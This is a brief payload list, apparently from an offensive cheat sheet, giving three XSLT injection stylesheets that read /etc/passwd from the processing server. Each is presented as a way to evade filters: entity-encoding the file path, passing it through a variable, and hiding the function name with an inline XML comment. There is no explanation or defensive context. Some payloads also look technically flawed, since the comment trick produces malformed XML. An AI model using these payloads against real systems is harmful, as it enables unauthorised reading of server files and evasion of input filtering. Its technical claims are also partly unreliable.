1- Entity Encoding
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="unparsed-text('&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;')"/>
  </xsl:template>
</xsl:stylesheet>
```
2- Dynamic Evaluation
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:variable name="path" select="'file:///etc/passwd'"/>
  <xsl:template match="/">
    <xsl:copy-of select="document($path)"/>
  </xsl:template>
</xsl:stylesheet>
```
3- Comment Obfuscation
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="doc<!--Comment-->ument('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```